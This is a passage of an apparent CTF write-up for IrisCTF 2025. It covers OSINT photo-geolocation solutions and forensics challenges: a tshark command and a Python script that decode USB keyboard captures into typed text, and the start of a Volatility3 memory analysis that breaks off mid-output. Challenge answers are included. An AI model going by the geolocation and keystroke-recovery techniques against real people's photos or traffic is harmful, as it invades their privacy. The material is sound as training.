class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Victoria-</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">The</span> <span class="selector-tag">cheapest</span> <span class="selector-tag">unleaded</span> <span class="selector-tag">petrol</span> <span class="selector-tag">in</span> <span class="selector-tag">Victoria</span> <span class="selector-tag">today</span> <span class="selector-tag">costs</span> <span class="number">169.9</span> <span class="selector-tag">cents</span> <span class="selector-tag">per</span> <span class="selector-tag">litre</span>. <span class="selector-tag">You</span> <span class="selector-tag">can</span> <span class="selector-tag">find</span> <span class="selector-tag">it</span> <span class="selector-tag">at</span> <span class="selector-tag">Liberty</span> <span class="selector-tag">Pakenham</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">The</span> <span class="selector-tag">cheapest</span> <span class="selector-tag">diesel</span> <span class="selector-tag">available</span> <span class="selector-tag">in</span> <span class="selector-tag">Victoria</span> <span class="selector-tag">costs</span> <span class="number">183.9</span> <span class="selector-tag">cents</span> <span class="selector-tag">per</span> <span class="selector-tag">litre</span>. <span class="selector-tag">You</span> <span class="selector-tag">can</span> <span class="selector-tag">find</span> <span class="selector-tag">it</span> <span class="selector-tag">at</span> <span class="selector-tag">SE</span> <span class="selector-tag">Fuel</span> <span class="selector-tag">in</span> <span class="selector-tag">Mount</span> <span class="selector-tag">Waverley</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Metro</span> – <span class="selector-tag">Melbourne</span>                                <span class="selector-tag">Statewide</span></span><br><span class="line"><span class="selector-tag">Unleaded</span> <span class="number">91</span><span class="number">183.9</span> (Metro Petroleum Maribynong)<span class="number">169.9</span> (Liberty Pakenham)</span><br><span class="line"><span class="selector-tag">Premium</span> <span class="selector-tag">Unleaded</span> <span class="number">95</span><span class="number">187.9</span> (APCO Hoppers Crossing)<span class="number">191.5</span> (APCO Bendigo)</span><br><span class="line"><span class="selector-tag">Premium</span> <span class="selector-tag">Unleaded</span> <span class="number">98</span><span class="number">204</span> (Liberty Baxter)        <span class="number">197.9</span> (Shell Heywood)</span><br><span class="line"><span class="selector-tag">Diesel</span> <span class="number">183.9</span> (SE Fuel Mount Waverley)                <span class="number">189.1</span> (Independent Morwell)</span><br></pre></td></tr></table></figure><p>I started searching with all the locations mentioned above from the beginning. Finally, when I was searching for the <code>SE Fuel Mount Waverly</code> location on Google Maps, I found some of these fuel stations:</p><p><img src="/images/posts/2025-irisctf/osint/fd/se_fuel_search_result.png" alt="SE Fuel Mount Waverly"></p><p>After scrolling down, I identified that the Shell station was the desired fuel station. If you check the photos or the 360-degree view of that location, it was identifiable with the provided image.</p><p>Location : <a href="https://maps.app.goo.gl/3CazWSRMCeDk5Wip7">Shell</a></p><h5 id="Creating-the-Flag-4"><a href="#Creating-the-Flag-4" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, let’s construct the flag using the defined format.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;203_Gallaghers_Road_Glen_Waverley_Victoria_Australia&#125;</span></span><br></pre></td></tr></table></figure><p>Woah!!!</p><h3 id="Where’s-Bobby"><a href="#Where’s-Bobby" class="headerlink" title="Where’s Bobby"></a>Where’s Bobby</h3><h4 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/wb/desc.png" alt="Description"></p><p>Source File: <a href="/images/posts/2025-irisctf/osint/wb/wheres-bobby.tar.gz">files</a></p><p>Hints releasd on Discord Announcements:</p><p><img src="/images/posts/2025-irisctf/osint/wb/hints.png" alt="Hints"></p><h4 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h4><p>If you came directly to this challenge’s writeup, I will recommend you first read my <code>Checking Out Of Winter</code> writeup because I have made it in detail, specifying some important notes.</p><p>So again, let’s search for the keywords. I got these: <em>Road Trip, Water Body, Not much populated areas</em> - traces left by the author.</p><p>Provided Image:</p><img src="/images/posts/2025-irisctf/osint/wb/wheres-bobby.jpg" alt="Source File Image" height="700"><!-- ![Source File Image](/images/posts/2025-irisctf/osint/wb/wheres-bobby.jpg) --><p>I like the view of the image. This image was taken from a car on a road that appears to be in the middle of the mountains.</p><p>When we zoom in on the image, we can see something written in Chinese on the board. I checked it using Google Translator:</p><img src="/images/posts/2025-irisctf/osint/wb/translated.jpg" alt="Translated" height="400"><!-- ![Translated Text](/images/posts/2025-irisctf/osint/wb/translated.jpg) --><p>Translated Text in the above image:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smooth traffic from Xishatun Bridge to Louzizhuang Bridge.</span><br></pre></td></tr></table></figure><p>The board was showing the traffic conditions of the upcoming bridges, which means the author was about to enter this bridge via the connected roads from where they were coming.</p><p>The possible routes near these two bridges are:<br>G7, G6, G4501, S216, S321, S3801.</p><p><img src="/images/posts/2025-irisctf/osint/wb/google_map.png" alt="Google Map"></p><p>As the author mentioned the surroundings of the route as <em>Water Body, Not much populated areas</em>, the road in the provided image was surrounded by mountains.</p><p>With these specifications, I started matching the description with the route numbers found earlier:</p><ul><li>I couldn’t find a water body around G7.</li><li>G6 was heavily populated.</li><li>G4501 was not deep into the mountains.</li><li>S216 and S321 were primarily in city regions.</li><li>Lastly, S3801 had water bodies and very sparsely populated areas around it, which led me to consider it for flag verification.</li></ul><h5 id="Creating-the-Flag-5"><a href="#Creating-the-Flag-5" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, let’s construct the flag using the defined format.</p><p>Hooray! It was the correct flag!!!</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;S3801_CN&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Where’s-Bobby-2"><a href="#Where’s-Bobby-2" class="headerlink" title="Where’s Bobby 2"></a>Where’s Bobby 2</h3><h4 id="Challenge-Description-7"><a href="#Challenge-Description-7" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/wb2/desc.png" alt="Description"></p><p>Source File: <a href="/images/posts/2025-irisctf/osint/wb2/wheres-bobby-2.tar.gz">files</a></p><p>Hints released on Discord Announcements:<br><img src="/images/posts/2025-irisctf/osint/wb2/hints.png" alt="Hints"></p><p>Youtube Video Link: <a href="https://www.youtube.com/watch?v=L9Di-UVC-_4">https://www.youtube.com/watch?v=L9Di-UVC-_4</a></p><h4 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h4><p>If you came directly to this challenge’s writeup, I will recommend you first read my <code>Checking Out Of Winter</code> writeup because I have made it in detail, specifying some important notes.</p><p>Provided Image:</p><p><img src="/images/posts/2025-irisctf/osint/wb2/wheres-bobby-2.jpg" alt="Wall Art"></p><p>I did a Reverse Image Search using Google Lens and found these helpful sites:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- https://ameblo.jp/yorinoto/entry-12733913890.html</span><br><span class="line">- https://m.sohu.com/a/545522713_99946287/?pvid=000115_3w_a</span><br></pre></td></tr></table></figure><p>After exploring these sites, I discovered that the location name is <code>Bai Zi Wan Subway Station</code>, and the wall art is <code>&quot;Hundred Ziwan Kissho&quot; / &quot;The Hundred Children Playing in Baizi Bay&quot;</code> painting.</p><h5 id="The-Challenge-with-Finding-the-Coordinates"><a href="#The-Challenge-with-Finding-the-Coordinates" class="headerlink" title="The Challenge with Finding the Coordinates"></a>The Challenge with Finding the Coordinates</h5><p>Finding the exact coordinates was tough for non-Chinese users because all locations on Google Maps for China are shifted by a few units. You can learn more about this issue from the provided YouTube video.</p><p>Although it was mentioned not to use Chinese maps or software, I took a look on the <code>Baidu Map</code>.</p><p><img src="/images/posts/2025-irisctf/osint/wb2/baid_maps.png" alt="Baidu Map"></p><p>As shown, the main station and the exit buildings are located at the bottom part of the image.</p><p>When I checked Google Maps, I got this result:</p><p><img src="/images/posts/2025-irisctf/osint/wb2/google_map.png" alt="Google Map"></p><p>The coordinates were shifted, and submitting them didn’t yield the correct result.</p><p>I also tried the English version of Wikipedia, which had the coordinates for the station, but again, they were incorrect. Wikipedia then directed me to Bing Maps:</p><p><img src="/images/posts/2025-irisctf/osint/wb2/bing.png" alt="Bing Map"></p><p>However, the coordinates from Bing Maps were also inaccurate.</p><h5 id="Exploring-Other-Sources"><a href="#Exploring-Other-Sources" class="headerlink" title="Exploring Other Sources"></a>Exploring Other Sources</h5><p>Next, I started searching for documented articles that might include the exact coordinates for the station. I looked at the <a href="https://baike.baidu.com/">Baidu Encyclopedia</a> site:</p><p><img src="/images/posts/2025-irisctf/osint/wb2/baidu_encyclo.png" alt="Baidu Encyclo"></p><p>Unfortunately, it didn’t mention any coordinates.</p><p>Finally, after more extensive searching 😵‍💫, I found the Chinese-language version of <a href="https://zh.wikipedia.org/zh-cn">Wikipedia</a>, specifically tailored for Simplified Chinese characters (used in Mainland China and Singapore).</p><p><img src="/images/posts/2025-irisctf/osint/wb2/wiki.png" alt="Wikipedia(CN)"></p><p>Link: <a href="https://zh.wikipedia.org/zh-cn/%E7%99%BE%E5%AD%90%E6%B9%BE%E7%AB%99_(%E5%9C%B0%E9%93%81)">https://zh.wikipedia.org/zh-cn/%E7%99%BE%E5%AD%90%E6%B9%BE%E7%AB%99_(%E5%9C%B0%E9%93%81)</a></p><p>This page included the coordinates.</p><h5 id="Verifying-the-Coordinates"><a href="#Verifying-the-Coordinates" class="headerlink" title="Verifying the Coordinates"></a>Verifying the Coordinates</h5><p>I quickly entered the coordinates on Google Maps. Although the result was still shifted from the exact building, I refined the search as shown below:</p><p><img src="/images/posts/2025-irisctf/osint/wb2/correct_coords.png" alt="Google Maps"></p><p>Coordinates: 39.891389, 116.491667</p><p>I rounded off the coordinates to 3 decimal points: 39.891, 116.492.</p><p>After submitting these refined coordinates, I confirmed that they were the desired ones for this challenge. 😮‍💨</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;39.891_116.492&#125;</span></span><br></pre></td></tr></table></figure><p><em>This marks the last challenge based on the files. Thanks to <code>bobby</code> for creating this amazing challenge; I really enjoyed it.</em></p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Deldeldel"><a href="#Deldeldel" class="headerlink" title="Deldeldel"></a>Deldeldel</h3><h4 id="Challenge-Description-8"><a href="#Challenge-Description-8" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/forensics/deldeldel/desc.png" alt="Description"></p><p>Source File: <a href="/images/posts/2025-irisctf/forensics/deldeldel/deldeldel.tar.gz">deldeldel.tar.gz</a></p><h4 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file klogger.pcapng </span><br><span class="line">klogger.pcapng: pcapng capture file - version 1.0</span><br></pre></td></tr></table></figure><p>We received a .pcapng file for this challenge. When I opened it in Wireshark, the packets were exclusively based on the USB protocol.</p><p><img src="/images/posts/2025-irisctf/forensics/deldeldel/usb_protocol.png" alt="USB Protocol Packets"></p><p>The mention of “keys” and the file name klogger (key logger) hinted that this was likely a USB Keyboard&#x2F;Keypad challenge.</p><p>USB Protocol challenges are a standard type in the Forensics category of CTFs and often repeat with slight modifications. The goal is to extract the USB HID data or CAP data available at the bottom of the packets, which contains useful information about the user’s activity on the USB device.</p><p>Sources:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.usb.org/developers/hidpage/ </span><br><span class="line"></span><br><span class="line">See section 10 Keyboard/Keypad Page (0x07) of document USB HID Usage Tables Version 1.12.</span><br><span class="line"></span><br><span class="line">Definition of these 3 bytes can be found in section B.1 Protocol 1 (Keyboard) of document Device Class Definition for HID Version 1.11.</span><br></pre></td></tr></table></figure><p>To analyze the user’s activity, we check the flow of USB IN packets (packets sent from the device to the host). These are typically user activities.</p><h5 id="Filtering-the-USB-IN-Packets"><a href="#Filtering-the-USB-IN-Packets" class="headerlink" title="Filtering the USB IN Packets"></a>Filtering the USB IN Packets</h5><p>To narrow down the USB IN packets, I applied the following filter in Wireshark:</p><p><code>usb.transfer_type == 1 &amp;&amp; usb.endpoint_address.direction == 1</code></p><p><img src="/images/posts/2025-irisctf/forensics/deldeldel/usb_in.png" alt="USB IN Packets"></p><p>Here, we can see source IPs such as 1.3.2, 1.7.1, 1.5.1, and 1.5.2.</p><h5 id="Extracting-USB-CAP-Data"><a href="#Extracting-USB-CAP-Data" class="headerlink" title="Extracting USB CAP Data"></a>Extracting USB CAP Data</h5><p>The USB HID data&#x2F;CAP data is usually 8 bytes. I started by analyzing the packets from 1.3.2, as they had 8-byte CAP data.</p><p>To extract the USB capture data, I used the tshark CLI. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r klogger.pcapng -Y <span class="string">&quot;usb.transfer_type == 1 &amp;&amp; usb.endpoint_address.direction == 1 &amp;&amp; usb.src==1.3.2&quot;</span> -T fields -e usb.capdata &gt; data_1.3.2.txt</span><br></pre></td></tr></table></figure><h5 id="Parsing-USB-CAP-Data"><a href="#Parsing-USB-CAP-Data" class="headerlink" title="Parsing USB CAP Data"></a>Parsing USB CAP Data</h5><p>For parsing the USB capture data into readable data, I used the following script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># USB HID Keymap for decoding key codes</span></span><br><span class="line">KEY_CODES = &#123;</span><br><span class="line">    <span class="number">0x04</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;A&#x27;</span>], <span class="number">0x05</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;B&#x27;</span>], <span class="number">0x06</span>: [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;C&#x27;</span>], <span class="number">0x07</span>: [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;D&#x27;</span>],</span><br><span class="line">    <span class="number">0x08</span>: [<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;E&#x27;</span>], <span class="number">0x09</span>: [<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;F&#x27;</span>], <span class="number">0x0A</span>: [<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;G&#x27;</span>], <span class="number">0x0B</span>: [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;H&#x27;</span>],</span><br><span class="line">    <span class="number">0x0C</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;I&#x27;</span>], <span class="number">0x0D</span>: [<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;J&#x27;</span>], <span class="number">0x0E</span>: [<span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;K&#x27;</span>], <span class="number">0x0F</span>: [<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;L&#x27;</span>],</span><br><span class="line">    <span class="number">0x10</span>: [<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;M&#x27;</span>], <span class="number">0x11</span>: [<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;N&#x27;</span>], <span class="number">0x12</span>: [<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;O&#x27;</span>], <span class="number">0x13</span>: [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;P&#x27;</span>],</span><br><span class="line">    <span class="number">0x14</span>: [<span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>], <span class="number">0x15</span>: [<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;R&#x27;</span>], <span class="number">0x16</span>: [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;S&#x27;</span>], <span class="number">0x17</span>: [<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;T&#x27;</span>],</span><br><span class="line">    <span class="number">0x18</span>: [<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;U&#x27;</span>], <span class="number">0x19</span>: [<span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;V&#x27;</span>], <span class="number">0x1A</span>: [<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;W&#x27;</span>], <span class="number">0x1B</span>: [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;X&#x27;</span>],</span><br><span class="line">    <span class="number">0x1C</span>: [<span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>], <span class="number">0x1D</span>: [<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>], <span class="number">0x1E</span>: [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;!&#x27;</span>], <span class="number">0x1F</span>: [<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;@&#x27;</span>],</span><br><span class="line">    <span class="number">0x20</span>: [<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;#&#x27;</span>], <span class="number">0x21</span>: [<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;$&#x27;</span>], <span class="number">0x22</span>: [<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;%&#x27;</span>], <span class="number">0x23</span>: [<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;^&#x27;</span>],</span><br><span class="line">    <span class="number">0x24</span>: [<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>], <span class="number">0x25</span>: [<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;*&#x27;</span>], <span class="number">0x26</span>: [<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;(&#x27;</span>], <span class="number">0x27</span>: [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;)&#x27;</span>],</span><br><span class="line">    <span class="number">0x28</span>: [<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>], <span class="number">0x2A</span>: [<span class="string">&#x27;[BACKSPACE]&#x27;</span>, <span class="string">&#x27;[BACKSPACE]&#x27;</span>], <span class="number">0x2B</span>: [<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>],</span><br><span class="line">    <span class="number">0x2C</span>: [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>], <span class="number">0x2D</span>: [<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>], <span class="number">0x2E</span>: [<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;+&#x27;</span>], <span class="number">0x2F</span>: [<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>],</span><br><span class="line">    <span class="number">0x30</span>: [<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>], <span class="number">0x33</span>: [<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>], <span class="number">0x34</span>: [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>], <span class="number">0x36</span>: [<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>],</span><br><span class="line">    <span class="number">0x37</span>: [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>], <span class="number">0x38</span>: [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;?&#x27;</span>], <span class="number">0x39</span>: [<span class="string">&#x27;[CAPSLOCK]&#x27;</span>, <span class="string">&#x27;[CAPSLOCK]&#x27;</span>],</span><br><span class="line">    <span class="number">0x4F</span>: [<span class="string">u&#x27;→&#x27;</span>, <span class="string">u&#x27;→&#x27;</span>], <span class="number">0x50</span>: [<span class="string">u&#x27;←&#x27;</span>, <span class="string">u&#x27;←&#x27;</span>], <span class="number">0x51</span>: [<span class="string">u&#x27;↓&#x27;</span>, <span class="string">u&#x27;↓&#x27;</span>], <span class="number">0x52</span>: [<span class="string">u&#x27;↑&#x27;</span>, <span class="string">u&#x27;↑&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_keylogger</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">    decoded_output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the 8-bytes payload</span></span><br><span class="line">        modifier = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        key_code = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ignore empty key codes</span></span><br><span class="line">        <span class="keyword">if</span> key_code == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Decode keypress</span></span><br><span class="line">        is_shift = (modifier &amp; <span class="number">0x02</span>) != <span class="number">0</span>  <span class="comment"># Check if Shift is active</span></span><br><span class="line">        char = KEY_CODES.get(key_code, [<span class="string">&#x27;&#x27;</span>])[is_shift]  <span class="comment"># Select shifted/unshifted char</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;[BACKSPACE]&#x27;</span>:  <span class="comment"># Handle backspace</span></span><br><span class="line">            decoded_output = decoded_output[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decoded_output += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded_output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: python3 script.py &lt;data.txt&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    file_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    result = decode_keylogger(file_path)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 usbkeyboard.py data_1.3.2.txt </span><br><span class="line">gabaacbacaabbbbabbabcbbcccdcdcdcccbccbbcbaaaaaaaaabcabadadcacacbacaaabbbacbacbcbb</span><br></pre></td></tr></table></figure><p>However, the data retrieved from 1.3.2 was garbage. I then moved on to another source IP (1.5.1), which also had 8-byte CAP data, and repeated the tshark steps.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 usbkeyboard.py data_1.5.1.txt </span><br><span class="line">Hheey   AAalicce! Ii  tthink  Ii<span class="string">&#x27;&#x27;</span>m  ssupppooseed  too  giivee yoou   tiss fllaag:</span><br><span class="line"></span><br><span class="line">iriisctfF&#123;[tthis_akeyloggeer_iisS_too_hard_to_use&#125;</span><br></pre></td></tr></table></figure><h5 id="Creating-the-Flag-6"><a href="#Creating-the-Flag-6" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>After extracting the data, I cleaned up the received flag and formatted it properly as per the challenge’s defined format.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;this_keylogger_is_too_hard_to_use&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Windy-Day"><a href="#Windy-Day" class="headerlink" title="Windy Day"></a>Windy Day</h3><h4 id="Challenge-Description-9"><a href="#Challenge-Description-9" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/forensics/wd/desc.png" alt="Description"></p><h4 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h4><p>We received a memory dump for this challenge. The title, <code>Windy Day</code>, hints towards Windows OS, and the description, <code>lost track of an important note...</code>, suggests we may need to retrieve some crucial information from the memory.</p><h5 id="Initial-Analysis"><a href="#Initial-Analysis" class="headerlink" title="Initial Analysis"></a>Initial Analysis</h5><p>I started analyzing the memory dump using <a href="https://github.com/volatilityfoundation/volatility3">Volatility3</a>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f memdump.mem windows.info</span><br><span class="line">Volatility 3 Framework 2.12.0</span><br><span class="line">Progress:  100.00PDB scanning finished                        </span><br><span class="line">VariableValue</span><br><span class="line"></span><br><span class="line">Kernel Base0xf80365200000</span><br><span class="line">DTB0x1ab000</span><br><span class="line">Symbolsfile:///home/ubuntu/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/D5E3E35C1C2D48E9906F43C7C05FA3F0-1.json.xz</span><br><span class="line">Is64BitTrue</span><br><span class="line">IsPAEFalse</span><br><span class="line">layer_name0 WindowsIntel32e</span><br><span class="line">memory_layer1 FileLayer</span><br><span class="line">KdVersionBlock0xf803654f4df8</span><br><span class="line">Major/Minor15.14393</span><br><span class="line">MachineType34404</span><br><span class="line">KeNumberProcessors1</span><br><span class="line">SystemTime2025-01-03 17:11:15+00:00</span><br><span class="line">NtSystemRootC:\Windows</span><br><span class="line">NtProductTypeNtProductServer</span><br><span class="line">NtMajorVersion10</span><br><span class="line">NtMinorVersion0</span><br><span class="line">PE MajorOperatingSystemVersion10</span><br><span class="line">PE MinorOperatingSystemVersion0</span><br><span class="line">PE Machine34404</span><br><span class="line">PE TimeDateStampTue Oct 22 04:58:19 2024</span><br></pre></td></tr></table></figure><p>As usual, I first listed all the processes. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f memdump.mem windows.pslist</span><br><span 